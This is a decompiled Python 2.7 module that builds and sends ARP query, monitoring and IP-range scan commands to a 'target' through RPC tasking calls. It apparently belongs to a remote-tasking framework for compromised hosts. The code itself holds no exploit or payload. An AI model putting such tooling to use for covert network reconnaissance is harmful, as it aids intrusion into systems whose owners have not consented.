# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_Arp_Tasking.py
ARP_QUERY = 1
ARP_MON = 2
ARP_SCAN = 3

def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.network.cmd.arp', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.network.cmd.arp.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    msg = MarshalMessage()
    if lpParams['instruction'] == ARP_QUERY:
        rpc = mca.network.cmd.arp.tasking.RPC_INFO_QUERY
    elif lpParams['instruction'] == ARP_MON:
        if lpParams['entries'] == 0:
            mcl.tasking.EchoError('Number of entries must be non-zero')
            return False
        monParams = mca.network.cmd.arp.MonitorParams()
        monParams.delay = lpParams['delay']
        monParams.entries = lpParams['entries']
        monParams.sendInterval = lpParams['sendInterval']
        if monParams.delay.m_seconds == 0:
            monParams.delay.m_seconds = 1
        rpc = mca.network.cmd.arp.tasking.RPC_INFO_MONITOR
        monParams.Marshal(msg)
        rpc.SetData(msg.Serialize())
    elif lpParams['instruction'] == ARP_SCAN:
        scanParams = mca.network.cmd.arp.ScanParams()
        scanParams.delay = lpParams['delay']
        scanParams.startIp = lpParams['startIp']
        scanParams.endIp = lpParams['endIp']
        import mcl.object.IpAddr
        if scanParams.startIp.GetType() == mcl.object.IpAddr.IpAddr.IPADDR_TYPE_IPV4 and scanParams.startIp.GetAddr() == 0:
            mcl.tasking.EchoError('Invalid starting IP address')
            return False
        if scanParams.endIp.GetType() == mcl.object.IpAddr.IpAddr.IPADDR_TYPE_IPV4 and scanParams.endIp.GetAddr() == 0:
            scanParams.endIp = scanParams.startIp
        if scanParams.delay.m_seconds == 0:
            scanParams.delay.m_seconds = 1
        rpc = mca.network.cmd.arp.tasking.RPC_INFO_SCAN
        scanParams.Marshal(msg)
        rpc.SetData(msg.Serialize())
    else:
        mcl.tasking.EchoError('Invalid instruction (%u)' % lpParams['instruction'])
        return False
    rpc.SetMessagingType('message')
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mca.network.cmd.arp.errorStrings)
        return False
    return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)